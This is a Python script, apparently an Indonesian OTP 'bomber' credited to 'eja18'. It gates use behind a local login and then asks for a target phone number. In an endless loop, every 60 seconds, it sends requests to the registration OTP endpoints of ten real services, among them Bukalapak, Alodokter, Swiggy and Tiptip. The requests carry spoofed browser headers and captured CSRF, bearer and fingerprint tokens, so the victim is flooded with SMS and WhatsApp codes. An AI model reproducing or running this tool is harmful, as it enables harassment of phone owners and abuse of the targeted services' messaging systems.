import os
import sys
import json
import time
import uuid
import hashlib
import requests
from datetime import datetime
from os import system
from time import sleep

system("clear")

USERS_FILE = "users.json"
DEVICE_FILE = "device.id"


def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()


def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    try:
        with open(USERS_FILE, "r") as f:
            data = json.load(f)
            return data.get("users", [])
    except Exception:
        return []


def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump({"users": users}, f, indent=4)


def get_device_id():
    if not os.path.exists(DEVICE_FILE):
        dev_id = str(uuid.uuid4())
        with open(DEVICE_FILE, "w") as f:
            f.write(dev_id)
        return dev_id
    with open(DEVICE_FILE, "r") as f:
        return f.read().strip()


def update_last_seen(username):
    users = load_users()
    for u in users:
        if u.get("username") == username:
            u["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            break
    save_users(users)


def cek_login(username, password, device_id):
    users = load_users()
    hash_pw = hash_password(password)
    for u in users:
        if u.get("username") == username and u.get("password") == hash_pw:
            if u.get("status", "aktif") != "aktif":
                return False, "Akun kamu di-BAN", None

            dev_tersimpan = u.get("device_id", "")

            if not dev_tersimpan:
                u["device_id"] = device_id
                save_users(users)
                return True, u.get("username"), None

            if dev_tersimpan == device_id:
                return True, u.get("username"), None

            u["status"] = "banned"
            save_users(users)
            return False, "Terdeteksi login dari device lain. Akun di-BAN!", "banned"

    return False, "Username atau password salah", None


def login():
    device_id = get_device_id()
    while True:
        system("clear")
        print("\033[33m+==========================================+\033[0m")
        print("\033[33m|            \033[1;97mLOGIN DULU\033[0m                    \033[33m|\033[0m")
        print("\033[33m+==========================================+\033[0m")
        print()
        username = input("Username : ").strip()
        password = input("Password : ").strip()

        if not username or not password:
            print("\033[91m[!] Username/password tidak boleh kosong\033[0m")
            sleep(2)
            continue

        valid, pesan, alasan = cek_login(username, password, device_id)

        if valid:
            print()
            print("\033[92m[OK] Login berhasil! Selamat datang, " + pesan + "\033[0m")
            sleep(2)
            system("clear")
            return pesan
        else:
            print()
            print("\033[91m[!] " + pesan + "\033[0m")
            if alasan == "banned":
                print("\033[91m[!] Program berhenti.\033[0m")
                sleep(3)
                sys.exit(1)
            print("\033[91m[!] Coba lagi...\033[0m")
            sleep(3)


username_aktif = login()

print("\033[33m[ Author                     : eja18 ]\033[0m")
print("\033[33m[ Github                     :       ]\033[0m")
print("\033[33m[ Versi                      : 1.0   ]\033[0m")
print("\033[33m[ MASIH DALAM PERKEMBANGAN           ]\033[0m")
print()

number = input("Masukan Nomor : ")

if number.startswith("0"):
    number_swiggy = number[1:]
elif number.startswith("62"):
    number_swiggy = number[2:]
else:
    number_swiggy = number

if number.startswith("0"):
    number_ruparupa = "+62" + number[1:]
elif number.startswith("62"):
    number_ruparupa = "+" + number
else:
    number_ruparupa = "+62" + number

if number.startswith("0"):
    number_tiptip = "+62" + number[1:]
elif number.startswith("62"):
    number_tiptip = "+" + number
elif number.startswith("+"):
    number_tiptip = number
else:
    number_tiptip = "+62" + number

headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id",
    "Content-Type": "application/json",
    "Origin": "https://duniagames.co.id",
    "Referer": "https://duniagames.co.id/",
    "Sec-Ch-Ua": '"Chromium";v="139", "Not A=Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?1",
    "Sec-Ch-Ua-Platform": "Android",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
}

headers2 = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive",
    "Content-Type": "application/json",
    "Cookie": "_ga=GA1.1.2043610545.1789618437; _fbp=fb.1.1789618437966.108430085181728019",
    "Host": "internetrakyat.id",
    "Origin": "https://internetrakyat.id",
    "Referer": "https://internetrakyat.id/auth/register",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
}

headers3 = {
    "Host": "www.acc.co.id",
    "Connection": "keep-alive",
    "sec-ch-ua-platform": '"Android"',
    "next-action": "7f8e862fff4b3a97ae5e866780a086283a999e8a7f",
    "sec-ch-ua": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "Accept": "text/x-component",
    "Content-Type": "text/plain;charset=UTF-8",
    "Origin": "https://www.acc.co.id",
    "Referer": "https://www.acc.co.id/register/new-account",
}

headers4 = {
    "Host": "www.alodokter.com",
    "x-csrf-token": "GH8r9CP5WeAokSA4ZHsuqAqjb0HMT4h0pUoNnLAwhtSRDIfUiy/SNUwwC8JqmxTVTaFQ34+iqiWFnJipIEN4rA==",
    "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://www.alodokter.com",
    "referer": "https://www.alodokter.com/login-alodokter",
    "accept": "application/json",
}

headers5 = {
    "Host": "www.swiggy.com",
    "user-id": "0",
    "__fetch_req__": "true",
    "content-type": "application/json",
    "platform": "mweb",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://www.swiggy.com",
    "referer": "https://www.swiggy.com/auth/register",
    "accept": "*/*",
}

headers6 = {
    "Host": "accounts.bukalapak.com",
    "x-request-id": "vTQuQ5uQOtBym8M3p72Tv0_pl-3SsYsUD_wAbsBiNI0_213fd0d7-5e05-4dbc-8fbc-eaa489107f29",
    "bukalapak-identity": "2181a1b40ba241efa1717a45630325b5",
    "bukalapak-otp-method": "whatsapp",
    "bukalapak-otp-device-id": "2181a1b40ba241efa1717a45630325b5",
    "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://accounts.bukalapak.com",
    "referer": "https://accounts.bukalapak.com/register",
    "accept": "*/*",
}

headers7 = {
    "Host": "member.speedcash.co.id",
    "time-request": "1789702884192",
    "x-csrf-token": "2bb3e02137facad997bd08e9e2c0c871ce7cb569c91b451f13783df40bf00e715b23b60210d5573ab39cc7260982e5940ad88a1fdc120c64f220877b8c0176d8",
    "authorization": "Bearer YzZmNDM2YzliYjVkMDE1Y2I4MDhmYjFlMjY5NDA3MTgwYmEzMWQ1NmNjZjNmMzQ1Yjc2NTM1MDIyZTFlMDUwY2ZmMTY5MzVmZTMyZjIyOTM2ZmNmZjZhZmM4MDRhNjM2",
    "x-xsrf-token": "eyJpdiI6IlpnbWZvakI4eGJ1ZjhPM2MwUWQ3dlE9PSIsInZhbHVlIjoiWFF3SW9NUENYUEE2RUxDUk9vS2FZamZYdFg4eGlqYmdjTlU2Nm5KRFhZa1NJN3Y3NnVwOTJDYzNJSlFpZTBtaiIsIm1hYyI6IjJmM2M4Y2IzYjUwNzc0MGY4YzYxZmE3M2ExM2M3MmRhMmU5YzQ0MzBlYWIwYjc0ZTQ2MzQ2MDZmZDFlYmMzZTQifQ==",
    "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://member.speedcash.co.id",
    "accept": "application/json",
}

headers8 = {
    "Host": "wapi.ruparupa.com",
    "x-frontend-type": "mobile",
    "user-platform": "mobile",
    "rr-sid": "r9lmZ1789704272NDVH26g5xn",
    "b2b-type": "non-b2b",
    "x-company-name": "ruparupa",
    "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://www.ruparupa.com",
    "referer": "https://www.ruparupa.com/auth/otp-verification",
    "accept": "application/json",
}

headers9 = {
    "Host": "app.kpoin.com",
    "applicationbrand": "0",
    "datetimetick": "639253509000170000",
    "applicationchannel": "901101",
    "applicationstoreid": "0",
    "content-type": "application/json",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://app.kpoin.com",
    "referer": "https://app.kpoin.com/registration",
    "accept": "application/json",
}

headers10 = {
    "Host": "api.tiptip.id",
    "channel-device": "Chrome",
    "language": "id",
    "x-queueit-ajaxpageurl": "https%3A%2F%2Ftiptip.id%2Fsign-up%3Fref%3D%252F",
    "request-id": "SwppP6Uc",
    "channel": "WEB",
    "content-type": "application/json",
    "ip-address": "119.235.223.58",
    "country-code": "ID",
    "channel-fingerprint-additional": "34ba2198689a92d4380b1e648493c81c",
    "channel-fingerprint": "1a0b93ec39474f-0b6d104881fe98-b457253-53c31-1a0b93ec394750",
    "channel-app-version": "2.27.38",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36",
    "origin": "https://tiptip.id",
    "referer": "https://tiptip.id/sign-up?ref=%2F",
    "accept": "application/json",
}


def baca_respons(r):
    try:
        data = r.json()
    except Exception:
        return None, None
    pesan = None
    for key in ["message", "rd", "error", "errorMessage", "msg", "detail", "statusMessage"]:
        if isinstance(data, dict) and data.get(key):
            pesan = data[key]
            break
    detik = None
    if isinstance(data, dict):
        if "data" in data and isinstance(data["data"], dict):
            if "next_request_in_second" in data["data"]:
                detik = data["data"]["next_request_in_second"]
            if "retry_after" in data["data"]:
                detik = data["data"]["retry_after"]
    return pesan, detik


def tampilkan(no, r):
    if r.status_code == 200:
        print("\033[92m[OK " + str(no) + "] Bos, pesan sudah terkirim\033[0m")
        return
    pesan, detik = baca_respons(r)
    kode = r.status_code
    print("\033[91m[E" + str(kode) + "-" + str(no) + "] Gagal (HTTP " + str(kode) + ")\033[0m")
    if detik:
        print("\033[33m         Tunggu " + str(detik) + " detik\033[0m")
    elif pesan:
        print("\033[91m         " + str(pesan) + "\033[0m")


def handle_exception(no, e):
    print("\033[91m[E" + str(no) + "] Error: " + str(e) + "\033[0m")


round_ke = 0

while True:
    round_ke += 1
    update_last_seen(username_aktif)

    teks_tengah = "ROUND " + str(round_ke)
    lebar = 42
    teks_tengah = teks_tengah.center(lebar)
    print()
    print("\033[36m+" + "-" * lebar + "+\033[0m")
    print("\033[36m|\033[0m\033[1;97m" + teks_tengah + "\033[0m\033[36m|\033[0m")
    print("\033[36m+" + "-" * lebar + "+\033[0m")
    print()

    try:
        post = requests.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", headers=headers, json={"phoneNumber": number, "userName": number}, timeout=15)
        tampilkan(1, post)
    except Exception as e:
        handle_exception(1, e)

    try:
        post2 = requests.post("https://internetrakyat.id/api/app/auth/send-otp-register", headers=headers2, json={"phone_number": number}, timeout=15)
        tampilkan(2, post2)
    except Exception as e:
        handle_exception(2, e)

    try:
        post3 = requests.post("https://www.acc.co.id/register/new-account", headers=headers3, json=[{"user_id": None, "action": "register", "send_to": number, "provider": "whatsapp"}], timeout=15)
        tampilkan(3, post3)
    except Exception as e:
        handle_exception(3, e)

    try:
        post4 = requests.post("https://www.alodokter.com/api/users/check_registered_pin", headers=headers4, json={"user": {"phone": number}}, timeout=15)
        tampilkan(4, post4)
    except Exception as e:
        handle_exception(4, e)

    try:
        post5 = requests.post("https://www.swiggy.com/mapi/auth/signup", headers=headers5, json={"name": "User", "mobile": number_swiggy, "countryCode": "62", "countryKey": "ID", "_csrf": "NRI3upykYUrC-atLBdQ8Yh7I2JVuou2ohUvV-od0"}, timeout=15)
        tampilkan(5, post5)
    except Exception as e:
        handle_exception(5, e)

    try:
        post6 = requests.post("https://accounts.bukalapak.com/register", headers=headers6, json={"user": {"phone": number}}, timeout=15)
        tampilkan(6, post6)
    except Exception as e:
        handle_exception(6, e)

    try:
        post7 = requests.post("https://member.speedcash.co.id/api/twice/otp/generate", headers=headers7, json={"phone": number, "state": "REGISTER", "type": "WA"}, timeout=15)
        tampilkan(7, post7)
    except Exception as e:
        handle_exception(7, e)

    try:
        post8 = requests.post("https://wapi.ruparupa.com/v3/otp/generate", headers=headers8, json={"target": number_ruparupa, "send_to": "whatsapp", "intent": "register", "action": "verify_phone"}, timeout=15)
        tampilkan(8, post8)
    except Exception as e:
        handle_exception(8, e)

    try:
        post9 = requests.post("https://app.kpoin.com/api/bff/v1/notification/sendotp", headers=headers9, json={"UniqueID": number, "NotifType": "109104", "OtpType": "119103", "OtpDigit": 6}, timeout=15)
        tampilkan(9, post9)
    except Exception as e:
        handle_exception(9, e)

    try:
        post10 = requests.post("https://api.tiptip.id/authentication/guest/v1/phone/otp/send", headers=headers10, json={"action": "SIGN_UP", "delivery_method": "WA", "phone_number": number_tiptip}, timeout=15)
        tampilkan(10, post10)
    except Exception as e:
        handle_exception(10, e)

    print()
    print("\033[90mRound " + str(round_ke) + " selesai. Jeda 60 detik...\033[0m")
    print("\033[90mTekan CTRL+C untuk berhenti.\033[0m")
    sleep(60)
